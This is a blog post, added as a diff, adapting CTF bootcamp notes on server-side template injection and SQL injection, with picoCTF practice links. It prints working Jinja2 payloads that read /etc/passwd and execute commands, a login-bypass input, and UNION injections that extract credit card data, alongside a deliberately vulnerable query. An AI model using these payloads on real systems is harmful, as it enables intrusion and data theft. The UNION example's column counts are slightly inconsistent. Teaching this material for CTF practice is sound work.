@@ -1,0 +1,571 @@
+---
+layout: post
+title: "CTF Bootcamp S6: ;DROP flags --"
+author: "GGG"
+date: 2026-04-06
+excerpt: "CTF Bootcamp S6: ;DROP flags --. This article adapts the bootcamp session notes into a readable post. View the slides at /ctf-bootcamp/Session6/."
+comment: true
+---
+
+<p>This article adapts the bootcamp session notes into a readable post. <a href="/ctf-bootcamp/Session6/">View the slides</a>.</p>
+<h1 id="today">Today</h1>
+<ul>
+<li>Dynamic web pages
+<ul>
+<li>Server-side template injection</li>
+</ul></li>
+<li>SQL</li>
+<li>SQL injection</li>
+<li>Database introspection</li>
+<li>Hack time!</li>
+</ul>
+<h1 id="tools">Tools</h1>
+<p>Install please:</p>
+<ul>
+<li>Burp Suite</li>
+</ul>
+<h1 id="dynamic-web-pages">Dynamic web pages</h1>
+<p>While an HTTP request to a site will usually deliver HTML content,
+this content may not be always static</p>
+<p>Think a social media or news site, the information displayed varies
+though the day</p>
+<h2 id="client-side-dynamic-web-pages">Client-side dynamic web
+pages</h2>
+<p>The dynamism can occur client-side by loading an initial HTML and
+scripts (JS) that make subsequent requests that modify the DOM with the
+dynamic content</p>
+<h3 id="example">Example</h3>
+{% highlight html %}
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>View user</title>
+  </head>
+  <body>
+    <p id="output">Loading...</p>
+
+    <script>
+      fetch("/user")
+        .then((response) => response.json())
+        .then((data) => {
+          document.getElementById("output").textContent =
+            data.name + " (" + data.email + ")";
+        })
+        .catch(() => {
+          document.getElementById("output").textContent =
+            "Failed to load data.";
+        });
+    </script>
+  </body>
+</html>
+{% endhighlight %}
+<p>The server would implement the <code>/user</code> endpoint and have
+it return the appropriate information.</p>
+<h2 id="server-side-dynamic-web-pages">Server-side dynamic web
+pages</h2>
+<p>Instead of the client building the page, the server can build the
+response HTML using server-side scripts (e.g., PHP, Python, Node).</p>
+<h2 id="server-side-templates">Server-side templates</h2>
+<p>Instead of having to create the response HTML by doing many string
+operations, we can specify some skeleton for the response and have
+values placed into the skeleton when generating the response.</p>
+<p>Server-side templates specify that skeleton, some logic and variables
+that must be passed to render the template.</p>
+<h3 id="example-1">Example</h3>
+<p><code class="verbatim">templates/base.html</code></p>
+{% highlight text %}
+<!DOCTYPE html>
+<html>
+<head>
+    <title>&#123;&#123; title &#125;&#125;</title>
+</head>
+<body>
+    <header>
+        <h1>Flask App</h1>
+        <hr>
+    </header>
+
+    &#123;% block content %&#125;&#123;% endblock %&#125;
+</body>
+</html>
+{% endhighlight %}
+<p><code class="verbatim">templates/index.html</code></p>
+{% highlight text %}
+&#123;% extends "base.html" %&#125;
+
+&#123;% block content %&#125;
+    <h2>Fruit List</h2>
+    <ul>
+        &#123;% for item in items %&#125;
+            <li>&#123;&#123; item &#125;&#125;</li>
+        &#123;% endfor %&#125;
+    </ul>
+&#123;% endblock %&#125;
+{% endhighlight %}
+<p><code class="verbatim">app.py</code></p>
+{% highlight python %}
+from flask import Flask, render_template
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    items = ["Apples", "Bananas", "Cherries"]
+    return render_template("index.html", title="Home", items=items)
+
+if __name__ == "__main__":
+    app.run()
+{% endhighlight %}
+<h1 id="server-side-template-injection-ssti">Server-side template
+injection (SSTI)</h1>
+<p>While passing variables to the template render function is usually
+safe (the programming language and templating engine take care of that),
+direct string interpolation into template code is usually not.</p>
+<p>If we manage to inject code into the template before it's rendered,
+we could have that code execute in the server while the template is
+inflated.</p>
+<h2 id="identifying-possible-injection">Identifying possible
+injection</h2>
+<p>We can notice server side rendering when a page request varies its
+response and no client side rendering is being done.</p>
+<p>We may be asked to fill a form and get some HTML response back with
+some portion of the form reflected.</p>
+<h2 id="testing">Testing</h2>
+<p>We can try testing for some basic injections in the possible
+vulnerable parameters and see if we manage to execute code or have the
+server respond 500.</p>
+<h2 id="templating-languages">Templating languages</h2>
+<p>The testing payloads and exploitation routes depend on the templating
+engine used in the backend.</p>
+<p>This varies according to the programming language used and
+programming languages may have different templating engines
+availables</p>
+<img src="/ctf-bootcamp/Session6/img/template-identification.png"/>
+<p>A general payload that should 500 many templates engines is:</p>
+{% highlight text %}
+$&#123;&#123;<%[%'"&#125;&#125;%\.
+{% endhighlight %}
+<p>Once identified the templating engine, we should consult the
+documentation of the template engine and the programming language to
+find how to exploit it.</p>
+<p>Or use resources like <a href="https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html">HackTricks</a>
+and <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/">PayloadsAllTheThings</a>.</p>
+<h2 id="jinja2">Jinja2</h2>
+<p>Jinja is a templating engine for Python web frameworks (e.g., Flask,
+Django).</p>
+<p>Expressions are evaluated like <code>{{ exp }}</code>, but we are
+restricted to what's present in the Jinja environment.</p>
+{% highlight text %}
+&#123;&#123; 7 * 7 &#125;&#125;
+{% endhighlight %}
+<p>Would result in <code>49</code>.</p>
+<h3 id="payload-examples">Payload examples</h3>
+<p>Read files:</p>
+{% highlight text %}
+&#123;&#123; ''.__class__.__mro__[2].__subclasses__() &#125;&#125;
+{% endhighlight %}
+<p>We get a list of classes, locate <code>File</code>.</p>
+<p>Assuming it's <code>40</code>.</p>
+{% highlight text %}
+&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() &#125;&#125;
+{% endhighlight %}
+<p>Execute commands:</p>
+{% highlight text %}
+&#123;&#123; self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() &#125;&#125;
+{% endhighlight %}
+<p>We may have to adapt our payloads to work properly in the server
+instance.</p>
+<h3 id="template-examples">Template examples</h3>
+<p><strong>TODO</strong></p>
+<h1 id="exercises">Exercises</h1>
+<ul>
+<li>SSTI1 <a href="https://play.picoctf.org/practice/challenge/492">https://play.picoctf.org/practice/challenge/492</a></li>
+<li>SSTI2 <a href="https://play.picoctf.org/practice/challenge/488">https://play.picoctf.org/practice/challenge/488</a></li>
+</ul>
+<h1 id="sql-databases">SQL databases</h1>
+<p>Web applications store data on databases.</p>
+<p>The most common storage are SQL databases.</p>
+<p>SQL queries are used by the web application to retrieve data from the
+DB.</p>
+<p>This means that client requests cause SQL statements to be executed,
+probably with some user controlled arguments used.</p>
+<img src="/ctf-bootcamp/Session6/img/web_server_layers.png"/>
+<h1 id="sql">SQL</h1>
+<p>While there are many SQL DBMS that vary in some syntax and semantics
+details, they adhere to a common ISO standard for the <em>Structured
+Query Language</em>.</p>
+<p>There are SQL statements for retrieving, updating, deleting, and
+inserting data.</p>
+<p>There are SQL statements for managing database objects (tables,
+schemas, users).</p>
+<h2 id="tables">Tables</h2>
+<p>A SQL table is a set of tuples (or rows) with common headings (i.e.,
+a position represent some attribute in each tuple).</p>
+<img src="/ctf-bootcamp/Session6/img/sql-table.png"/>
+<h3 id="definition-example">Definition example</h3>
+{% highlight sql %}
+CREATE TABLE logins (
+    id INT,
+    username VARCHAR(100),
+    password VARCHAR(100),
+    date_of_joining DATETIME
+    );
+{% endhighlight %}
+<h2 id="schemas">Schemas</h2>
+<p>A schema is a grouping of SQL tables.</p>
+<p>Generally one application will use one schema for its data. Other
+applications may reuse the DB by specifying their own schema.</p>
+<p>SQL statements are executed in the context of a schema on which
+unqualified tables will be searched (table names can reoccur among
+schemas).</p>
+<p>Nonetheless, schemas can be specified on a per table basis like
+<code>schema.table</code>.</p>
+<p>Note: SQLite does not use schemas, all tables live in the same
+namespace.</p>
+<h2 id="insert"><code>INSERT</code></h2>
+<p>Insert rows into a table.</p>
+{% highlight sql %}
+INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
+{% endhighlight %}
+<h2 id="select"><code>SELECT</code></h2>
+<p>Select data from a table.</p>
+{% highlight sql %}
+SELECT column1, column2 FROM table_name;
+{% endhighlight %}
+<p>The column names must be present in the table.</p>
+<p>We can query for all columns with <code>*</code>.</p>
+{% highlight sql %}
+SELECT * FROM table_name;
+{% endhighlight %}
+<p>We can also evaluate expressions among columns.</p>
+{% highlight sql %}
+SELECT column1 * column2 FROM table_name;
+{% endhighlight %}
+<p>And even use literals</p>
+{% highlight sql %}
+SELECT 100 + column1 FROM table_name;
+{% endhighlight %}
+<h3 id="where">WHERE</h3>
+<p>We can filter results of <code>SELECT</code> queries.</p>
+{% highlight sql %}
+SELECT * FROM table_name WHERE <expression>;
+{% endhighlight %}
+<p>Possible expressions are:</p>
+{% highlight sql %}
+exp1 < exp2
+{% endhighlight %}
+<p>Also <code>&lt;=</code>, <code>&gt;</code>, and so.</p>
+<p>Expressions may be literals (e.g., <code>'ABC</code>, <code>2</code>)
+or column names to refer to the corresponding value in a tuple (the
+condition is evaluated for each row).</p>
+<p>Likewise, each expression may be other expressions to create complex
+filters.</p>
+{% highlight sql %}
+exp1 = exp2
+exp1 != exp2
+{% endhighlight %}
+<p>Test equality and inequality.</p>
+{% highlight sql %}
+exp1 AND exp2
+{% endhighlight %}
+<p>And between two expressions.</p>
+{% highlight sql %}
+exp1 OR exp2
+{% endhighlight %}
+<p>Or between two expressions.</p>
+{% highlight sql %}
+NOT exp
+{% endhighlight %}
+<p>Negates expression result.</p>
+<p>Operator precedence is defined in the usual way (e.g., <a href="https://mariadb.com/docs/server/reference/sql-structure/operators/operator-precedence">MariaDB</a>).</p>
+<p>We can group expressions to force precedence</p>
+{% highlight sql %}
+(exp)
+{% endhighlight %}
+<h3 id="example-2">Example</h3>
+<p>A possible query to check for user credentials could be:</p>
+{% highlight sql %}
+SELECT * FROM user WHERE username = 'tom' AND password = 'toor';
+{% endhighlight %}
+<h2 id="update"><code>UPDATE</code></h2>
+<p>Update (modify in place) rows in a table.</p>
+{% highlight sql %}
+UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
+{% endhighlight %}
+<p>The possible <code>condition</code> are the same as for the
+<code>SELECT</code> statements.</p>
+<h1 id="sql-injection">SQL injection</h1>
+<p>Same as in SSTI, there are safe ways of adding user parameters to
+queries.</p>
+<p>Parameterized query:</p>
+{% highlight python %}
+def login(username, password):
+    conn = sqlite3.connect("users.db")
+    cursor = conn.cursor()
+
+    cursor.execute(
+        "SELECT * FROM users WHERE username = ? AND password = ?",
+        (username, password)
+    )
+
+    result = cursor.fetchone()
+    conn.close()
+
+    return result
+{% endhighlight %}
+<p>But as in SSTI, raw string interpolation is vulnerable:</p>
+{% highlight python %}
+def login(username, password):
+    conn = sqlite3.connect("users.db")
+    cursor = conn.cursor()
+
+    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+    cursor.execute(query)
+
+    result = cursor.fetchone()
+    conn.close()
+
+    return result
+{% endhighlight %}
+<p>A normal user may give values that when interpolated result in the
+intended query.</p>
+<p>Take username = <code>john</code>, password =
+<code>neogeo</code>.</p>
+{% highlight sql %}
+SELECT * FROM users WHERE username = 'john' AND password = 'neogeo'
+{% endhighlight %}
+<p>But a malicious user could send username = <code>admin' --</code>,
+password = <code>pwnd</code>.</p>
+<p>The query would become:</p>
+{% highlight sql %}
+SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'pwnd'
+{% endhighlight %}
+<p>As <code>--</code> is the line comment sequence for SQL, the rest of
+the query is ignored and the query is subverted.</p>
+<h2 id="sql-comments">SQL comments</h2>
+<p>The comment sequence for SQL is <code>--</code> , it indicates that
+the rest of the query line should be ignored.</p>
+<p>The sequences <code>/*</code> and <code>#</code> work in some RDBMs
+too.</p>
+<h1 id="subverting-queries">Subverting queries</h1>
+<p>To inject into a query, we must have an idea of the query
+structure.</p>
+<p>In the previous example:
+<code>username = '{username}' AND password = '{password}'</code>, our
+input was surrounded by single quotes, so our payload was <code class="verbatim">admin' --</code> that escaped the quotes and then
+started a comment to ignore the rest of the query line that would be
+invalid syntax otherwise.</p>
+<p>We would like to get an error (500 probably) and a valid query to
+know that we have escaped the query structure.</p>
+<p>Some payloads to test are <code class="verbatim">'</code>, <code class="verbatim">"</code>, <code class="verbatim">#</code>, <code class="verbatim">;</code> and <code class="verbatim">)</code>.</p>
+<p>Once identified the surrounding context, we may inject the query to
+accomplish our objectives.</p>
+<h1 id="exercises-1">Exercises</h1>
+<ul>
+<li>SQLiLite <a href="https://play.picoctf.org/practice/challenge/304">https://play.picoctf.org/practice/challenge/304</a></li>
+<li>More SQLi <a href="https://play.picoctf.org/practice/challenge/358">https://play.picoctf.org/practice/challenge/358</a></li>
+<li>Irish-Name-Repo 1 <a href="https://play.picoctf.org/practice/challenge/80">https://play.picoctf.org/practice/challenge/80</a></li>
+<li>Irish-Name-Repo 2 <a href="https://play.picoctf.org/practice/challenge/59">https://play.picoctf.org/practice/challenge/59</a></li>
+<li>Irish-Name-Repo 3 <a href="https://play.picoctf.org/practice/challenge/8">https://play.picoctf.org/practice/challenge/8</a></li>
+</ul>
+<h1 id="union"><code>UNION</code></h1>
+<p>We can combine results of multiple SQL queries in one single
+expression.</p>
+{% highlight sql %}
+SELECT * FROM T1 UNION SELECT * FROM T2;
+{% endhighlight %}
+<p>Both SELECT expressions <strong>must return the same number of
+columns</strong>. The column names don't matter, the names from the
+first query are used for all.</p>
+<p>If we don't know how many columns are being returned, we can try
+guessing with literals until we get a successful query.</p>
+{% highlight sql %}
+SELECT * FROM T1 UNION SELECT 1 FROM T2;
+SELECT * FROM T1 UNION SELECT 1, 2 FROM T2;
+SELECT * FROM T1 UNION SELECT 1, 2, 3 FROM T2;
+{% endhighlight %}
+<p>The second query would have 1 column, 2 columns, and 3 columns
+respectively.</p>
+<h2 id="union-injection"><code>UNION</code> injection</h2>
+<p>Take our previous vulnerable query example:</p>
+{% highlight python %}
+query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+{% endhighlight %}
+<p>We could have username =
+<code>AAA' UNION SELECT cc_numbers, cc_cvv FROM credit_cards --</code>,
+password = <code>pwnd</code>.</p>
+<p>The query would become:</p>
+{% highlight sql %}
+SELECT * FROM users WHERE username = 'AAA' UNION SELECT cc_numbers, cc_cvv, 3 FROM credit_cards -- ' AND password = 'pwnd'
+{% endhighlight %}
+<p>And (assuming we have the right number of columns) we would be
+getting credit card details back with our response.</p>
+<h1 id="string-concatenation">String concatenation</h1>
+<p>DBMS support different syntax for concatenating strings.</p>
+<p>The two main ones are the function <code>CONCAT()</code> (most RDBMS)
+and the operator <code>||</code> (PostgreSQL, SQLite).</p>
+{% highlight text %}
+CONCAT('A', 'B')
+'A' || 'B'
+{% endhighlight %}
+<p>Both may result in in <code>'AB'</code>.</p>
+<p>We can use it to concatenate columns.</p>
+<p>In the previous example</p>
+{% highlight sql %}
+SELECT * FROM users WHERE username = 'AAA' UNION SELECT cc_numbers || ':' || cc_cvv FROM credit_cards -- ' AND password = 'pwnd'
+{% endhighlight %}
+<p>Would return <code>cc_numbers</code> and <code>cc_cvv</code> in a
+single column, which could be useful if we wanted to to return more
+values that columns we have visible in the output.</p>
+<h1 id="column-aggregation">Column aggregation</h1>
+<p>While the previous syntax worked for concatenating values in the same
+tuple, we can also concatenate values across tuples to collapse them
+into a single row (subject to <code>GROUP BY</code>).</p>
+{% highlight text %}
+STRING_AGG(row_expression, separator)  -- PostgreSQL, SQLite
+GROUP_CONCAT(row_expression SEPARATOR separator)  -- MySQL
+{% endhighlight %}
+<p>The <code>row_expression</code> to concatenate could be a single
+column name (e.g., <code>user</code>) or some other expression (e.g.,
+<code>user || password</code>, <code>CONCAT(user, password)</code>).</p>
+<h1 id="database-introspection">Database introspection</h1>
+<p>SQL databases store information about their schemas (e.g., schema
+names, table names, columns in table) into the database itself.</p>
+<p>This is usually in the special schema <a href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html"><code>information_schema</code></a>.</p>
+<p>Using this and <code>UNION</code>-injections we can enumerate the
+tables in a database.</p>
+<h2 id="information_schema.schemata"><code>information_schema.schemata</code></h2>
+<p>Information about all schemas in the server</p>
+<p>Columns:</p>
+<ul>
+<li><code>schema_name</code>: Schema name</li>
+</ul>
+{% highlight sql %}
+SELECT schema_name FROM information_schema.schemata;
+{% endhighlight %}
+<h2 id="information_schema.tables"><code>information_schema.tables</code></h2>
+<p>Information about all tables in the server</p>
+<p>Columns:</p>
+<ul>
+<li><code>table_schema</code>: Schema containing the table</li>
+<li><code>table_name</code>: Table name</li>
+</ul>
+{% highlight sql %}
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'app';
+{% endhighlight %}
+<h2 id="information_schema.columns"><code>information_schema.columns</code></h2>
+<p>Information about the columns in every table</p>
+<p>Columns:</p>
+<ul>
+<li><code>table_schema</code>: Schema containing the table</li>
+<li><code>table_name</code>: Table name</li>
+<li><code>column_name</code>: Column name</li>
+<li><code>data_type</code>: Column data type</li>
+</ul>
+{% highlight sql %}
+SELECT column_name, data_type FROM information_schema.columns
+WHERE table_schema = 'app' AND table_name = 'users';
+{% endhighlight %}
+<h2 id="table-enumeration">Table enumeration</h2>
+<p>After locating interesting tables and columns we can do our usual SQL
+queries to get their data.</p>
+{% highlight sql %}
+SELECT user, password FROM users;
+{% endhighlight %}
+<h3 id="password-dumping">Password dumping</h3>
+<p>Passwords are usually stored not as plaintext but as some hash of the
+corresponding password.</p>
+<p>Search instructions for <code>john</code> / <code>hashcat</code>
+cracking or use <a href="https://crackstation.net">https://crackstation.net</a></p>
+<p>More information to be seen in future cryptography session.</p>
+<h2 id="sqlite_schema"><code>sqlite_schema</code></h2>
+<p>For SQLite, we have a single table that contains the information
+about all tables in the database.</p>
+{% highlight sql %}
+CREATE TABLE sqlite_schema(
+  type text,
+  name text,
+  tbl_name text,
+  rootpage integer,
+  sql text
+);
+{% endhighlight %}
+<p>From the <a href="https://www.sqlite.org/schematab.html">documentation</a>:</p>
+<ul>
+<li><code>type</code>: 'table', 'index', 'view', or 'trigger'</li>
+<li><code>name</code>: name of the object</li>
+<li><code>sql</code>: SQL text that describes the object</li>
+</ul>
+<h3 id="example-3">Example</h3>
+{% highlight text %}
+sqlite> SELECT * FROM sqlite_schema;
+table|user|user|2|CREATE TABLE user (
+    id INTEGER NOT NULL,
+    username VARCHAR(80) NOT NULL,
+    password_hash VARCHAR(128) NOT NULL,
+    PRIMARY KEY (id),
+    UNIQUE (username)
+)
+index|sqlite_autoindex_user_1|user|3|
+table|code_snippet|code_snippet|4|CREATE TABLE code_snippet (
+    id INTEGER NOT NULL,
+    user_id INTEGER NOT NULL,
+    code TEXT NOT NULL,
+    PRIMARY KEY (id),
+    FOREIGN KEY(user_id) REFERENCES user (id)
+)
+{% endhighlight %}
+{% highlight text %}
+sqlite> SELECT sql FROM sqlite_schema WHERE name = 'user';
+CREATE TABLE user (
+    id INTEGER NOT NULL,
+    username VARCHAR(80) NOT NULL,
+    password_hash VARCHAR(128) NOT NULL,
+    PRIMARY KEY (id),
+    UNIQUE (username)
+)
+{% endhighlight %}
+<h1 id="blind-injections">Blind injections</h1>
+<p>Sometimes, we won't be able to view the result of the query
+directly.</p>
+<p>In such cases we are injecting <em>blind</em> and must use other
+mechanism to get the information back.</p>
+<p>If we can get some indicator that a query evaluated to false
+(returned no results), we do a boolean blind injection and extract one
+bit of information per query.</p>
+<p>If no such indicator exists, we may still be able to evaluate
+something like <code>SLEEP(5)</code> conditionally on the query and the
+query completion time would get us one bit of information.</p>
+<p>As these mechanism are query-intensive (many queries are needed to
+get complete information), we use automated tools or scripts that do the
+injections and data collection automatically.</p>
+<h2 id="sqlmap"><code>sqlmap</code></h2>
+<p>Automatic SQL injection and database takeover tool</p>
+<p>Very complete and many options, check the <code>--help</code>,
+<code>tldr</code> and online examples.</p>
+<p>e.g.,</p>
+{% highlight text %}
+sqlmap -u URL --data=DATA
+{% endhighlight %}
+<p>Tries to inject the given <em>URL</em> with POST data
+<em>DATA</em>.</p>
+<h1 id="exercises-2">Exercises</h1>
+<ul>
+<li>SQL Direct <a href="https://play.picoctf.org/practice/challenge/303">https://play.picoctf.org/practice/challenge/303</a></li>
+<li>Startup Company <a href="https://play.picoctf.org/practice/challenge/108">https://play.picoctf.org/practice/challenge/108</a></li>
+<li>PicoCTF 2026</li>
+</ul>
+<h1 id="further-learning">Further learning</h1>
+<ul>
+<li>pwn.college — Learn to Hack! <a href="https://pwn.college/">https://pwn.college/</a></li>
+</ul>
+<h1 id="references">References</h1>
+<ul>
+<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/">https://swisskyrepo.github.io/PayloadsAllTheThings/</a></li>
+<li><a href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/</a></li>
+</ul>
+<h1 id="hack-time">Hack time!</h1>
+<ul>
+<li><a href="https://play.picoctf.org/practice">https://play.picoctf.org/practice</a></li>
+<li><a href="https://www.root-me.org/">https://www.root-me.org/</a></li>
+</ul>
